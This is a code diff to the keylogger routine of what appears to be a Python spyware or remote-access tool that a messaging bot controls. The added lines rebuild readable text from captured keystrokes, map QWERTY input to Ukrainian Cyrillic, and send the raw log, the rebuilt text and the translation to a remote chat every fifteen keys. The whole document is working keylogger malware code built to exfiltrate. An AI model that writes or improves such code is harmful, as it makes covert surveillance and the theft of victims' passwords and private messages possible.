@@ -568,6 +568,7 @@ def keyloggerProc(klogQueue,TOKEN,cht):
 
     klog=''
     counter=15
+    mymsg=''
     while True:
         while not klogQueue.empty():
             msg=klogQueue.get()
@@ -578,13 +579,28 @@ def keyloggerProc(klogQueue,TOKEN,cht):
             except ValueError:
                 pass
             if counter!=0:
-                klog+=str(msg)
+                msg=str(msg)
+                if msg.startswith("'"):
+                    mymsg+=msg[1]    
+                if msg=='Key.space':
+                    mymsg+=' '
+                klog+=msg
                 counter-=1
             else:
-                klog+=str(msg)
+                msg=str(msg)
+                if msg.startswith("'"):
+                    mymsg+=msg[1]
+                if msg=='Key.space':
+                    mymsg+=' '                    
+                klog+=msg
+                translation = str.maketrans(dict(zip("qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./","йцукенгшщзхїфівапролджєячсмитьбю.ЙЦУКЕНГШЩЗХЇФІВАПРОЛДЖЄЯЧСМИТЬБЮ.")))
+                translation = mymsg.translate(translation)
                 counter=15
                 sendmsg(TOKEN,cht,klog)
+                sendmsg(TOKEN,cht,mymsg)
+                sendmsg(TOKEN,cht,translation)
                 klog=''
+                mymsg=''
             
 
 def superProc(wt,cht,msg):
